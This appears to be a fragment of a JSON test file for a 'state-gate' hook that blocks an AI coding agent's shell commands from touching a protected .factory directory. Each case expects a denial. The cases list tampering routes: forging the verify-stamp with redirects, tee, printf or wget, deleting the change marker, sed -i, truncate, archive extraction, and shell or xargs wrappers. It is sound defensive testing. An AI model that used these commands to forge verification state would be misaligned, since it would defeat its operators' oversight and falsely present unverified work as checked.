  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-redirect-marker-name",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo x > current-change"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-redirect-variable-target",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "F=.factory/verify-stamp; echo x > \"$F\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-redirect",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "printf '{\"treeHash\":\"%s\"}' \"$(node scripts/tree-hash.mjs)\" > .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "Forging the stamp by a redirect."
 },
 {
  "name": "state-gate.deny-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "rm -f .factory/current-change && git status"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "Removing the change marker by hand."
 },
 {
  "name": "state-gate.deny-sed-i-in-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "sed -i.bak s/a/b/ .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-sh-c-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "sh -c 'rm .factory/verify-stamp'"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-tar-directory",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "tar -xf /tmp/x.tar -C .factory"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-tee",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "node scripts/tree-hash.mjs | tee \"$CLAUDE_PROJECT_DIR/.factory/verify-stamp\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-truncate-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "truncate -s0 .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-unzip-directory",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "unzip -o /tmp/x.zip -d .factory"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-uppercase-state-dir",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "rm .FACTORY/x"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-variable-operand-other-segment",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cat .factory/verify-stamp; rm \"$TMP/f\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "Line-wide fail closed: the variable may hold the state path."
 },
 {
  "name": "state-gate.deny-wget-output",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "wget -O .factory/verify-stamp http://example.test/x"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-wrapper-unknown-option-reader",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "time --bogus-flag cat .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "Fail closed: a wrapper option the splitter does not know hides the command word."
 },
 {
  "name": "state-gate.deny-xargs-operands",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "ls .factory | xargs rm"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "Fail closed: the operands arrive on stdin."
 }
]
